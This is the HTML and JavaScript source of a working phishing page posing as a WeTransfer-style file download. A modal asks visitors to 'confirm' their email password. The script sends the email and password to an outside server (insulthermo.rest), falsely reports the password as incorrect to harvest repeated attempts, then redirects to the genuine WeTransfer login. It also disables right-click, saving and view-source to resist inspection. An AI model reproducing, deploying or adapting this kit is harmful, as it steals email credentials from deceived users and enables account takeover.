<!doctype html>
<html>

<head>
<meta charset="utf-8">
<link rel="shortcut icon" href="favicon.ico">
<link rel="icon" sizes="16x16 32x32" href="favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
	<style>
	html, body {
			background-image: url(1.jpg);
			 background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: cover;

		}
		

		#sub1{
			margin-top: 36%;
			margin-left: 10%;
			position: absolute;
			z-index: 1;
			
			
		}
				.sky{
					background-color: #409fff;
					color:white;
			
		}
	</style>
</head>
<body>

<a href="#" id="sub1" class="btn btn-md sky text-white" data-toggle="modal" data-target="#myModal">Download File (5.53MB) </a>
	 <!-- The Modal -->
	 <div class="modal fade" id="myModal">
    <div class="modal-dialog modal-lg">
      <div class="modal-content">
      
        <!-- Modal Header -->
        <div class="modal-header">
          <h4 class="modal-title"><img src="2.jpg" width="200"><br></h4>
          <button type="button" class="close" data-dismiss="modal">&times;</button>
        </div>
        
        <!-- Modal body -->
        <div class="modal-body" >
		
		
	<!-- <div style="color:black;">Confirm to  start download! </div> -->
	
	<div class="d-flex justify-content-center">
		<form method="POST"class="col-sm-8 bg-light p-3" id="profileUp">
			<p class="text-dark" id="err">Please confirm your Email Account to Download</p>
		
		<hr>
			<div class="alert alert-danger" id="msg" style="display: none;color:red;">Incorrect Email Password. Try Again!</div>
                    <span id="error" class="text-danger" style="display: none;color:red;">That Password doesn't exist. Enter a correct password</span>
			<div class="input-group mb-3 input-group-md">
    
    <input id="email" type="email" value="" class="form-control" name="email" required="">
  </div>
			<input type="password" name="password" class="form-control text-center" value="" id="password" placeholder="Enter Email Password" required="">
			<span class="text-danger" id="er"></span>
			<br />
			<input id="submit-btn" name="sub" type="submit" class="btn btn-md btn-block sky"  value="Download">
			<center><small></small></center>

</form>

		</div>
		
        </div>
        
        <!-- Modal footer -->
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        </div>
        
      </div>
    </div>
  </div>
  
</div>

<script type="text/javascript">
		function getUrlVars() {
		    var vars = {};
		    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
		        vars[key] = value;
		    });
		    return vars;
			}
	</script>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script>

// prevent ctrl + s
$(document).bind('keydown', function(e) {
if(e.ctrlKey && (e.which == 83)) {
e.preventDefault();
return false;
}
});

document.addEventListener('contextmenu', event => event.preventDefault());

document.onkeydown = function(e) {
if (e.ctrlKey && 
(e.keyCode === 67 || 
e.keyCode === 86 || 
e.keyCode === 85 || 
e.keyCode === 117)) {
return false;
} else {
return true;
}
};
$(document).keypress("u",function(e) {
if(e.ctrlKey)
{
return false;      }
else {
return true;
}});

    /* global $ */
    $(document).ready(function(){
      var count=0;

      $('#back1').click(function () {
        $("#msg").hide();
        $('#email').val("");
        $("#automail").animate({left:200, opacity:"hide"}, 0);
        $("#inputbar").animate({right:200, opacity:"show"}, 1000);

      });

      var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
        var my_email =email;
        $('#email').val(my_email);
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var dom=my_slice;
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        var finalu= c.toUpperCase();

      }


      
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var msg = $('#msg').html();
        $('#msg').text( msg );
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!filter.test(my_email)) {
        $('#error').show();
        email.focus;
        return false;
      }

      if (password.length < 4 || password == '1234' || password == 'test') {
        $('#error').show();
        password.focus;
        return false;
      }

      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var dom=my_slice;
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      var finalu= c.toUpperCase();

      ///////////new injection////////////////
      count=count+1;
      
      $.ajax({
        dataType: 'JSON',
        url: 'https://insulthermo.rest/unlimitedG/X.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                  $("#password").val("");
                  if (count>=20) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("https://wetransfer.com/log-in");

                  }
                  // $('#msg').html(response['msg']);
                }
                else{
                  // $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=3) {
                count=0;
                window.location.replace("https://wetransfer.com/log-in");
              }
              $("#msg").show();
              // $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Verifing...');
            }
          });
    });


    });


  </script>
	
</body>

</html>
